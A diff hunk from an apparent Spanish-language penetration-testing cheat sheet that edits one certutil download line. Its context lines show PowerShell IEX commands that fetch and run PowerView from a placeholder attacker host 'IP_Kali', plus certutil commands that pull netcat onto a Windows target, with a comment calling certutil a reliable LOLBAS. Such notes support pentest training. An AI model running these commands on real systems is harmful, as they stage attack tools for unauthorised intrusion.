@@ -70,7 +70,7 @@ EXTRA:
    ❯ IEX (New-Object Net.WebClient).DownloadString('http://IP_Kali/PowerView.ps1')
 
 2  ❯ certutil -urlcache -f http://IP_Kali/nc.exe C:\Users\Public\nc.exe
-   ❯ certutil.exe -f -urlcache -split http://IP_Kali/nc.exe C:\Temp\nc.exe
+   ❯ certutil.exe -f -urlcache -split http://IP_Kali/nc64.exe C:\Temp\nc64.exe
    ❯ C:\Windows\System32\certutil.exe -urlcache -f http://IP_Kali/nc.exe C:\Temp\nc.exe
    # Certutil → siempre disponible en Windows porque es un LOLBAS → muy fiable
 
